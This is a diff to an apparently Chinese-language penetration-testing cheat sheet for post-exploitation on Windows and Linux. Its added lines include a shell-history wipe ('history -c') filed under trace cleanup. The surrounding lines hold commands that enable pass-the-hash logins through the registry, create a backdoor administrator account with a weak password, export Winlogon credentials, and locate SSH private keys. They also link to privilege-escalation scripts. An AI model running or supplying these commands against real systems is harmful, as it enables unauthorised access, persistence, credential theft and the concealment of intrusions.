@@ -28,6 +28,8 @@ reg query HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\T
 reg export "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" Winlogon.reg
 dir D:\ /s | findstr /i ora >c:\tmp.txt # 查找ora文件
 dir /s /b *admin*                       # 查找admin相关文件.
+# 查找 包含 b 的文件
+findstr /S /M /C:"b" F:\aaa\*.*
 REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f   # 允许pth登录
 shell net user defaultuser1 123 /add && net localgroup administrators defaultuser1 /add
 
@@ -57,6 +59,7 @@ cat /proc/self/environ    # 环境变量
 /root/.ssh/authorized_keys
 /root/.ssh/id_rsa         # 私钥
 /root/.ssh/known_hosts    # 记录每个访问计算机用户的公钥
+
 
 
 # 应用配置
@@ -209,7 +212,7 @@ iptables -L    # 列出iptable的配置规则
 ```
 
 wmic qfe get Caption,Description,HotFixID,InstalledOn
-wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:“KBxxxxxx”
+wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KBxxxxxx"
 
 ## 权限维持
 
@@ -252,6 +255,12 @@ Host Information Gathering Script：HIGS.bat
 https://github.com/myh0st/scripts/blob/master/Windows%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/HIGS.bat
 privilege-escalation-awesome-scripts：winPEAS.bat
 https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat
+
+# 痕迹清理 | 文件清理 | linux
+
+```sh
+history -c
+```
 
 # 提权工具脚本
 
